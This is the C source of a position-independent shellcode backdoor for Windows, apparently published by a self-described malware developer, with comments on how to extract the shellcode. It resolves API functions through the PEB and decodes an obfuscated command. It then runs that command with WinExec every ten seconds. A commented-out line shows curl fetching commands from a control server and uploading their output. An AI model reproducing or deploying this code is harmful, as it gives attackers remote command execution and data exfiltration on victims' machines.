//Author: Shaddy43
//Designation: Malware Analyst, reverse engineer and malware developer
//Original credits to hasherezade of vxunderground who gave the methodology of creating postion independent shellcode
//I've followed the methodology to create a complete custom backdoor communicating on c3 using https and APIs

//This code is called position independent code because it doesn't depend on a linker to resolve external dependencies like importing dlls and using functions inside.
//This backdoor uses cmd to get commands from the c3 server after every 10 seconds and execute it on the system.
//The executed command is saved into a text file and then uploaded back to the c3 server.
//If we are not using stack-based strings, then we must inline-string in text section from data section for shellcode to work properly. I've used another tool for inlining strings: https://github.com/hasherezade/masm_shc
//With the help of MSVC we can convert this code to .asm file and then link those assembly instructions to a binary.
//After that we can extract shellcode from the .text section of that binary.

#include<windows.h>
#include "peb_lookup.h"

// It's worth noting that strings can be defined inside the .text section:
#pragma code_seg(".text")

void rot1(char*, size_t, bool);

int main()
{
    // Stack based strings for libraries and functions that shellcode needs
    wchar_t kernel32_dll_name[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };

    //This cmd is executed in WinExec, which gets command from the webpage (c3 server), executes that command on the system and finally upload the output back to the web server using Http/Https protocol.
    //LPCSTR cmd = "cmd.exe /c \"for /f \"delims=\" %i in ('curl URL_TO_GET_COMMANDS') do set output=%i && %i > C:\\users\\public\\temp.txt && curl --form \"fileToUpload=@C:\\users\\public\\temp.txt\" URL_TO_UPLOAD_OUTPUT \" ";
    
    //simple encoding added to the command
    char cmd[] = "Encoded url here.... simple encoding just +1 character";

	// resolve kernel32 image base
    LPVOID base = get_module_by_name((const LPWSTR)kernel32_dll_name);
    if (!base) {
        return 1;
    }

    // resolve loadlibraryA() address
    LPVOID load_lib = get_func_by_name((HMODULE)base, (LPSTR)"LoadLibraryA");
    if (!load_lib) {
        return 2;
    }

    // resolve getprocaddress() address
    LPVOID get_proc = get_func_by_name((HMODULE)base, (LPSTR)"GetProcAddress");
    if (!get_proc) {
        return 3;
    }

    //loadlibrarya and getprocaddress function definitions
    HMODULE(WINAPI * _LoadLibraryA)(LPCSTR lpLibFileName) = (HMODULE(WINAPI*)(LPCSTR))load_lib;
    FARPROC(WINAPI * _GetProcAddress)(HMODULE hModule, LPCSTR lpProcName)
        = (FARPROC(WINAPI*)(HMODULE, LPCSTR)) get_proc;

    //WinExec function definition
    UINT(WINAPI * _WinExec)(
        _In_ LPCSTR lpCmdLine,
        _In_ UINT uCmdShow) = (UINT (WINAPI*)(
            _In_ LPCSTR,
            _In_ UINT)) _GetProcAddress((HMODULE)base, (LPCSTR)"WinExec");
    if (_WinExec == NULL) return 4;

    //Sleep function definition
    VOID(WINAPI * _Sleep)(
        _In_ DWORD dwMilliseconds) = (VOID (WINAPI*)(
            _In_ DWORD)) _GetProcAddress((HMODULE)base, (LPCSTR)"Sleep");
    if (_Sleep == NULL) return 5;

    //decoding cmd
    rot1(cmd, sizeof(cmd), true);
    //While true because the backdoor gets command from the server after every 10 sec and executes it on the system.
    while(true)
	{
		UINT return_val = _WinExec(cmd, 0);
        _Sleep(10000);
	}
    rot1(cmd, sizeof(cmd), false);
    return 0;
}

void rot1(char* str, size_t str_size, bool decode)
{
    for (size_t i = 0; i < str_size - 1; i++) {
        if (decode) {
            str[i] -= 1;
        }
        else {
            str[i] += 1;
        }
    }
}

